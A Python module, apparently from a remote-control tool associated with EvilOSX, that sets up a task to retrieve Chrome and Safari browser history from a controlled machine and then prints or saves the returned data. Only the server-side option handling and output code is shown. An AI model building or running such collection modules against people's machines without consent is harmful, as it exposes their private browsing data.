# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

from os import mkdir

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Retrieve browser history (Chrome SQLite and Safari).",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "History limit (Leave empty for 10): ",
            "Output file name (Leave empty to print only, e.g. history.txt): "
        ]

    def setup(self, set_options):
        history_limit = set_options[0]
        output_name = set_options[1]

        if not history_limit:
            history_limit = 10

        if not str(history_limit).isdigit() or int(history_limit) <= 0:
            self._view.display_error("Invalid history limit, must be a positive number.")
            return False, None

        output_name = None
        if set_options[1]:
            # Never allow path traversal, only use the basename.
            basename = path.basename(set_options[1])
            output_name = basename if basename else None

        return True, {
            "history_limit": int(history_limit),
            "response_options": {
                "output_name": output_name
            }
        }

    def process_response(self, response, response_options):
        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        output_name = (response_options or {}).get("output_name")

        self._view.output_separator()
        self._view.output("Browser history:")
        self._view.output(str_response.strip() or "(No history returned)")

        if output_name:
            try:
                if not path.isdir(OUTPUT_DIRECTORY):
                    mkdir(OUTPUT_DIRECTORY)
                output_file = path.join(OUTPUT_DIRECTORY, output_name)
                with open(output_file, "w") as write_file:
                    write_file.write(str_response)
                self._view.output("History saved to: {}".format(path.realpath(output_file)), "info")
            except Exception as ex:
                self._view.display_error("Failed to save history: {}".format(str(ex)))
